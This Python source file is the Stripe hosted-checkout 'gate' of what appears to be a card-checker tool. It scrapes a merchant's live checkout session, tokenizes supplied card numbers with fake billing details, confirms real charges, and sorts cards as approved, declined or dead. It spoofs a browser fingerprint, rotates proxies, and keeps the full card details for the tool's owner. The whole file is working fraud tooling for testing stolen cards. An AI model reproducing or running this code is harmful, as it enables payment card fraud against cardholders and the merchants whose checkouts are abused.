"""
gateways/stripe_hosted_gate.py
Stripe Hosted Checkout Hitter Gate
Uses /v1/payment_pages/{session_id}/confirm endpoint
No hCaptcha needed - direct API hit
"""
import asyncio
import re
import random
import logging
from dataclasses import dataclass
from typing import Optional

logger = logging.getLogger("CC-Checker.StripeHosted")

STRIPE_VERSION = "fe3c872f40"

BASE_HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
}


@dataclass
class HostedSessionData:
    session_id: str
    pk: str
    amount: int          # in smallest unit (paise/cents)
    currency: str
    merchant: str
    mode: str            # payment / subscription
    init_checksum: str
    pi_id: Optional[str] = None


@dataclass
class HostedCheckResult:
    status: str          # APPROVED / DECLINED / 3DS / INSUFFICIENT / EXPIRED / ERROR
    message: str
    code: str
    card_display: str    # masked: 411111xxxxxx1111|mm|yy|xxx
    time_taken: float = 0.0
    raw_card: str = ""   # full card string for owner DM only


def _rand_guid() -> str:
    h = "0123456789abcdef"
    base = "-".join([
        "".join(random.choices(h, k=8)),
        "".join(random.choices(h, k=4)),
        "4" + "".join(random.choices(h, k=3)),
        random.choice("89ab") + "".join(random.choices(h, k=3)),
        "".join(random.choices(h, k=12))
    ])
    return base + "".join(random.choices(h, k=6))


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 1: Extract session data via Playwright
# ═══════════════════════════════════════════════════════════════════════════════
async def _extract_playwright_async(checkout_url: str) -> dict:
    from playwright.async_api import async_playwright

    captured = {
        "pk": None,
        "amount": None,
        "init_checksum": "",
        "merchant": "Unknown",
        "currency": "inr",
        "mode": "payment",
        "pi_id": None,
    }

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-blink-features=AutomationControlled"]
        )
        ctx = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
        )
        page = await ctx.new_page()
        done_event = asyncio.Event()

        def on_request(req):
            url = req.url
            mk = re.search(r'[?&]key=(pk_live_[a-zA-Z0-9]+)', url)
            if mk and not captured["pk"]:
                captured["pk"] = mk.group(1)

        async def on_response(resp):
            url = resp.url
            if "/v1/payment_pages/" in url and "confirm" not in url:
                try:
                    body = await resp.json()
                    ts = body.get("total_summary") or {}
                    amt = ts.get("due") or ts.get("total")
                    if amt and amt > 100:
                        captured["amount"] = amt
                    ic = body.get("init_checksum")
                    if ic:
                        captured["init_checksum"] = ic
                    captured["currency"] = body.get("currency", "inr").upper()
                    captured["mode"] = body.get("mode", "payment")
                    name = body.get("statement_descriptor") or body.get("name")
                    if name:
                        captured["merchant"] = name
                    pi = body.get("payment_intent") or {}
                    if pi.get("id"):
                        captured["pi_id"] = pi["id"]
                    if captured["pk"] and captured["amount"]:
                        done_event.set()
                except Exception:
                    pass
            elif "elements/sessions" in url:
                try:
                    body = await resp.json()
                    name = body.get("business_name")
                    if name:
                        captured["merchant"] = name
                except Exception:
                    pass

        page.on("request", on_request)
        page.on("response", on_response)

        try:
            await page.goto(checkout_url, wait_until="domcontentloaded", timeout=15000)
        except Exception:
            pass

        try:
            await asyncio.wait_for(done_event.wait(), timeout=10.0)
        except asyncio.TimeoutError:
            pass

        await ctx.close()
        await browser.close()

    return captured


def _extract_playwright_thread(checkout_url: str) -> dict:
    import sys
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(_extract_playwright_async(checkout_url))
    finally:
        loop.close()


async def extract_hosted_session(checkout_url: str) -> Optional[HostedSessionData]:
    """
    Load the Stripe Checkout page headlessly in a dedicated thread.
    Capture: PK, amount (with tax), init_checksum, merchant, session_id
    Returns HostedSessionData or None on failure.
    """
    m = re.search(r'cs_live_[a-zA-Z0-9]+', checkout_url)
    if not m:
        logger.error("No session_id found in URL")
        return None
    session_id = m.group(0)

    try:
        captured = await asyncio.to_thread(_extract_playwright_thread, checkout_url)
    except Exception as e:
        logger.error(f"Playwright extraction thread error: {e}")
        return None

    pk = captured.get("pk")
    amount = captured.get("amount")

    if not pk or not amount:
        logger.warning(f"Session extraction incomplete: pk={bool(pk)}, amount={bool(amount)}")
        return None

    return HostedSessionData(
        session_id=session_id,
        pk=pk,
        amount=amount,
        currency=captured["currency"],
        merchant=captured["merchant"],
        mode=captured["mode"],
        init_checksum=captured["init_checksum"],
        pi_id=captured["pi_id"],
    )


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 2: Tokenize card → PM ID
# ═══════════════════════════════════════════════════════════════════════════════
async def create_hosted_pm(
    session,
    card_number: str,
    card_month: str,
    card_year: str,
    card_cvv: str,
    session_data: HostedSessionData,
) -> tuple[Optional[str], str]:
    """
    POST /v1/payment_methods → pm_xxx
    Returns tuple: (pm_id_or_tag, error_message)
    """
    year = card_year.strip()
    if len(year) == 4:
        year = year[-2:]

    data = {
        "type": "card",
        "card[number]": card_number.replace(" ", ""),
        "card[cvc]": card_cvv,
        "card[exp_month]": card_month.strip().zfill(2),
        "card[exp_year]": year,
        "billing_details[name]": "John Smith",
        "billing_details[email]": "checkout@email.com",
        "billing_details[address][country]": "IN",
        "billing_details[address][line1]": "615 Main Road",
        "billing_details[address][city]": "New Delhi",
        "billing_details[address][state]": "DL",
        "billing_details[address][postal_code]": "110080",
        "guid": _rand_guid(),
        "muid": _rand_guid(),
        "sid": _rand_guid(),
        "key": session_data.pk,
        "payment_user_agent": f"stripe.js/{STRIPE_VERSION}; stripe-js-v3/{STRIPE_VERSION}; checkout",
        "client_attribution_metadata[client_session_id]": _rand_guid(),
        "client_attribution_metadata[checkout_session_id]": session_data.session_id,
        "client_attribution_metadata[merchant_integration_source]": "checkout",
        "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
    }

    try:
        r = await session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=BASE_HEADERS,
            data=data,
        )
        resp = r.json()
        if r.status_code == 200 and resp.get("id"):
            return resp["id"], "ok"

        err = resp.get("error") or {}
        msg = err.get("message", "Tokenization failed")
        code = err.get("code", "")
        msg_lower = msg.lower()

        logger.error(f"PM creation failed: {msg} [{code}] (HTTP {r.status_code})")

        if "expired" in msg_lower:
            return "__EXPIRED__", msg
        if "incorrect" in msg_lower and "number" in msg_lower:
            return "__INVALID__", msg
        if "cvc" in msg_lower or "security code" in msg_lower:
            return "__CVV__", msg
        if "test" in msg_lower and "live" in msg_lower:
            return "__TESTCARD__", msg
        return None, msg

    except Exception as e:
        logger.error(f"PM creation exception: {e}")
        return None, str(e)


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 3: Confirm payment → result
# ═══════════════════════════════════════════════════════════════════════════════
async def confirm_hosted_payment(
    session,
    pm_id: str,
    session_data: HostedSessionData,
) -> dict:
    """
    POST /v1/payment_pages/{session_id}/confirm
    Returns dict with status, message, code
    """
    data = {
        "eid": "NA",
        "payment_method": pm_id,
        "expected_amount": str(session_data.amount),
        "tax_id_collection[purchasing_as_business]": "false",
        "expected_payment_method_type": "card",
        "guid": _rand_guid(),
        "muid": _rand_guid(),
        "sid": _rand_guid(),
        "key": session_data.pk,
        "version": STRIPE_VERSION,
        "client_attribution_metadata[client_session_id]": _rand_guid(),
        "client_attribution_metadata[checkout_session_id]": session_data.session_id,
        "client_attribution_metadata[merchant_integration_source]": "checkout",
        "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
        "link_brand": "link",
    }
    if session_data.init_checksum:
        data["init_checksum"] = session_data.init_checksum

    url = f"https://api.stripe.com/v1/payment_pages/{session_data.session_id}/confirm"

    try:
        r = await session.post(url, headers=BASE_HEADERS, data=data)
        resp = r.json()
        sc = r.status_code

        if sc == 200:
            pi = resp.get("payment_intent") or resp.get("setup_intent") or {}
            status = pi.get("status") or resp.get("status", "")
            if status == "requires_action":
                return {"status": "3DS", "msg": "Requires 3DS Authentication", "code": "3ds"}
            return {"status": "APPROVED", "msg": "Payment Succeeded!", "code": ""}

        elif sc == 402:
            err = resp.get("error") or {}
            msg = err.get("message", "Declined")
            code = err.get("decline_code") or err.get("code") or "declined"
            if "insufficient" in msg.lower():
                return {"status": "INSUFFICIENT", "msg": msg, "code": code}
            if "3d secure" in msg.lower() or "authentication" in msg.lower():
                return {"status": "3DS", "msg": msg, "code": code}
            return {"status": "DECLINED", "msg": msg, "code": code}

        elif sc == 400:
            err = resp.get("error") or {}
            msg = err.get("message", str(resp)[:100])
            code = err.get("code", "bad_request")
            msg_l = msg.lower()
            if any(k in msg_l for k in ("expired", "completed", "no longer active", "canceled", "cancelled", "inactive")) or \
               any(k in code.lower() for k in ("expired", "checkout_not_active", "unexpected_state")):
                return {"status": "EXPIRED", "msg": "Checkout session expired or inactive", "code": code}
            if "amount_mismatch" in code or "mismatch" in msg_l:
                return {"status": "MISMATCH", "msg": msg, "code": code}
            return {"status": "ERROR", "msg": msg, "code": code}

        elif sc == 404:
            return {"status": "EXPIRED", "msg": "Checkout session not found (expired)", "code": "not_found"}

        else:
            logger.warning(f"Confirm unexpected HTTP {sc}: {r.text[:200]}")
            return {"status": "ERROR", "msg": f"HTTP {sc}: {r.text[:80]}", "code": str(sc)}

    except Exception as e:
        logger.error(f"Confirm exception: {e}")
        return {"status": "ERROR", "msg": str(e)[:100], "code": "exception"}


async def refetch_latest_amount(session, session_data: HostedSessionData) -> Optional[int]:
    """GET /v1/payment_pages/{session_id}?key={pk}&eid=NA to sync the latest invoice amount"""
    try:
        url = f"https://api.stripe.com/v1/payment_pages/{session_data.session_id}?key={session_data.pk}&eid=NA"
        r = await session.get(url, headers=BASE_HEADERS)
        if r.status_code == 200:
            body = r.json()
            ts = body.get("total_summary") or {}
            inv = body.get("invoice") or {}
            amt = ts.get("due") or ts.get("total") or inv.get("amount_due")
            if amt and amt > 100:
                logger.info(f"Refetched latest session amount: {session_data.amount} → {amt}")
                session_data.amount = amt
                if body.get("init_checksum"):
                    session_data.init_checksum = body["init_checksum"]
                return amt
    except Exception as e:
        logger.error(f"Error refetching session amount: {e}")
    return None


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN CHECK FUNCTION
# ═══════════════════════════════════════════════════════════════════════════════
async def check_stripe_hosted(
    card_str: str,
    session_data: HostedSessionData,
    proxy: Optional[str] = None,
) -> HostedCheckResult:
    """
    Full flow: tokenize + confirm for one card.
    card_str format: number|mm|yy|cvv
    """
    import time
    from curl_cffi.requests import AsyncSession

    parts = card_str.strip().split("|")
    if len(parts) != 4:
        return HostedCheckResult(
            status="ERROR", message="Bad format", code="format",
            card_display=card_str[:20]
        )

    number, month, year, cvv = [p.strip() for p in parts]
    display = f"{number[:6]}xxxxxx{number[-4:]}"

    t0 = time.monotonic()

    session_kwargs = {"impersonate": "chrome131"}
    if proxy:
        session_kwargs["proxy"] = proxy

    try:
        async with AsyncSession(**session_kwargs) as session:
            pm_id, pm_err = await create_hosted_pm(session, number, month, year, cvv, session_data)

            if pm_id == "__EXPIRED__":
                return HostedCheckResult("EXPIRED", pm_err, "expired", display, time.monotonic()-t0)
            if pm_id == "__INVALID__":
                return HostedCheckResult("DEAD", pm_err, "incorrect_number", display, time.monotonic()-t0)
            if pm_id == "__CVV__":
                return HostedCheckResult("DEAD", pm_err, "incorrect_cvc", display, time.monotonic()-t0)
            if pm_id == "__TESTCARD__":
                return HostedCheckResult("ERROR", pm_err, "test_card", display, time.monotonic()-t0)
            if not pm_id:
                return HostedCheckResult("ERROR", pm_err, "pm_fail", display, time.monotonic()-t0)

            # Confirm
            res = await confirm_hosted_payment(session, pm_id, session_data)

            # Auto-heal: if amount mismatched, sync latest invoice amount from GET payment_pages & retry confirm
            if res.get("status") == "MISMATCH" or res.get("code") == "checkout_amount_mismatch":
                logger.info(f"Amount mismatch detected for {display}. Auto-syncing latest invoice amount...")
                new_amt = await refetch_latest_amount(session, session_data)
                if new_amt:
                    res = await confirm_hosted_payment(session, pm_id, session_data)

    except Exception as ex:
        logger.error(f"check_stripe_hosted exception for {display}: {ex}")
        return HostedCheckResult("ERROR", str(ex)[:100], "exception", display, time.monotonic()-t0)

    elapsed = time.monotonic() - t0
    return HostedCheckResult(
        status=res["status"],
        message=res["msg"],
        code=res["code"],
        card_display=display,
        time_taken=elapsed,
        raw_card=card_str,   # full card → owner DM only
    )
